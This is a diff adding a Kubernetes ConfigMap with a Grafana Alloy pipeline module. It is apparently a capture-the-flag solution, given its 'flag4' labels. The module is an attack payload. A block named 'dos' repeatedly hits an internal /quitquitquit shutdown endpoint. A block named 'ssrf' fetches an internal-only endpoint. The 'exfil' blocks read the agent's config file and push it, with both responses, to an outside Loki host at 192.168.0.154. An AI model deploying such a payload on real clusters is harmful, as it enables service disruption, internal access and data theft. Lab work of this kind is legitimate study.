@@ -1,0 +1,38 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: user-pipeline
+  namespace: monitoring
+data:
+  module.alloy: |
+    declare "user_pipeline" {
+      remote.http "dos" {
+        url            = "http://internal-api.monitoring.svc:8080/quitquitquit"
+        poll_frequency = "2s"
+        poll_timeout   = "1s"
+      }
+
+      remote.http "ssrf" {
+        url            = "http://internal-api.monitoring.svc:8080/internal-endpoint"
+        poll_frequency = "15s"
+        poll_timeout   = "5s"
+      }
+
+      loki.source.file "exfil" {
+        targets = [{
+          __path__ = "/etc/alloy/config.alloy",
+          job      = "flag4-TIMESTAMP",
+        }]
+        forward_to = [loki.write.exfil.receiver]
+      }
+
+      loki.write "exfil" {
+        endpoint {
+          url = "http://192.168.0.154:3100/loki/api/v1/push"
+        }
+        external_labels = {
+          flag_4_ssrf = remote.http.ssrf.content,
+          flag_4_dos = remote.http.dos.content,
+        }
+      }
+    }
